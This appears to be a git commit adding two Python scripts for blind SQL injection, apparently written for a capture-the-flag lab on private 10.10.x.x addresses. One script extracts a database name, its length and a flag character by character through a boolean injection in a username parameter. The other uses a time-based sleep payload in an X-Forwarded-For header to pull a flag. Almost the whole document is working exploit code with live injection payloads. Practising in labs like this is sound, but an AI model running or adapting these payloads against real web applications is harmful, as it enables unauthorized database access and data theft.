18d5a8db3674e3ee024784ce5ac50f60e01e6e84
c3linux <c3linux@gmail.com>
2021-11-27 19:14:20 +0400

    SQLi Script

---
+++ sqli-boolean-based.py
@@ -0,0 +1,37 @@
+import time
+import requests
+def database_name():
+    flag =""
+    count=1
+    for i in range(8):
+        for a in range(48,126):
+            req=requests.get(url=f"http://10.10.79.117/register/user-check?username=admin' AND (ASCII(SUBSTR((select database()),{count},1))) = {a} --+")          
+            if 'false' in req.text:
+                flag+=chr(a)
+                count+=1
+                print(f"Flag is {flag}")
+                break
+
+
+def database_length(): 
+    for i in range(100):
+        req=requests.get(url=f"http://10.10.103.240/register/user-check?username=admin%27%20AND%20(length(database()))%20=%20{i}%20--+;")
+        if 'false' in req.text:
+            print(f"database length is {i}")
+        else:
+            print(f"database length is not {i}") 
+
+
+def flag_value():
+    flag =""
+    count=1
+    while chr(125) not in flag:
+        for a in range(48,126):
+            req=requests.get(url=f"http://10.10.79.117/register/user-check?username=admin' AND (ASCII(SUBSTR((select flag from sqhell_3.flag),{count},1))) = {a} --+")          
+            if 'false' in req.text:
+                flag+=chr(a)
+                count+=1
+                print(f"Flag is {flag}")
+                break
+
+
---
+++ sqli-time-based.py
@@ -0,0 +1,18 @@
+import time
+import requests
+
+flag = ""
+count = 1
+
+while chr(125) not in flag:
+    for a in range(48,126):
+        start = time.time()
+        req = requests.get(url="http://10.10.248.201/terms-and-conditions", headers={'X-Forwarded-For':f"1' AND (SELECT sleep(2) FROM flag where (ASCII(SUBSTR(flag,{count},1))) = '{a}'); --+"})
+        end = time.time()
+        
+        if end-start>=2:
+            flag+=chr(a)
+            count+=1
+            print("Flag: " + flag)
+            break
+print(flag)       
